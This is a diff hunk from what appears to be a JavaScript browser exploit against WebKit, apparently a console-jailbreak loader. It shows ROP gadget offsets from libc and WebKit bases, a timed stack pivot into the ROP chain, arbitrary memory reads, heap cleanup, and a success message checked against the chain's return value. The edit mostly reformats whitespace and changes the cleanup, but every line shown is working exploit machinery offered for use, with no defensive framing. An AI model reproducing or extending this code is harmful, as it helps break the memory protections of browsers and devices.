@@ -11408,14 +11408,15 @@ libc_base+248252,libc_base+50775,libc_base+793877,ropchain+220040,webkit_base+74
 ]);
 db([0, 0]);
 db([5, 0, 0, 0, 0, 0]);
-setTimeout(function(){                                                                                                                            
-pivot(ropchain);                                                                                                                                  
-},500);                                                                                                                                           
-var main_ret = read_ptr_at(main_ret);                                                                                                             
-var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);                                                                                     
-var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);                                                                       
-var _ = malloc_nogc.pop();                                                                                                                        
-var _ = malloc_nogc.pop();                                                                                                                        
+
+setTimeout(function(){                            
+pivot(ropchain);                          
+},500);                               
+var main_ret = read_ptr_at(main_ret);                         
+var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
+var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);               
+var _ = malloc_nogc.pop();                        
+var _ = malloc_nogc.pop();                        
 var _ = malloc_nogc.pop();
 delete _;
 delete printf_buf_end;
@@ -11425,10 +11426,7 @@ delete ropchain_array;
 delete ropchain_offset;
 delete printf_buf_offset;
 delete __swbuf_addr;
-if(main_ret==179|| main_ret==0){                                                                                                                  
-    window.msgs.innerHTML="<h1 style='font-size:25px;color:green;text-align:center;'>"+LoadedMSG+"</h1>";   
-    var main_ret = null;                                                                                                                          
-    setTimeout(function(){
-    parent.location.reload();
-    }, 13000);                                      
+if(main_ret==179|| main_ret==0){                          
+    delete main_ret;
+    window.msgs.innerHTML="<h1 style='font-size:25px;color:green;text-align:center;'>"+LoadedMSG+"</h1>";
 }
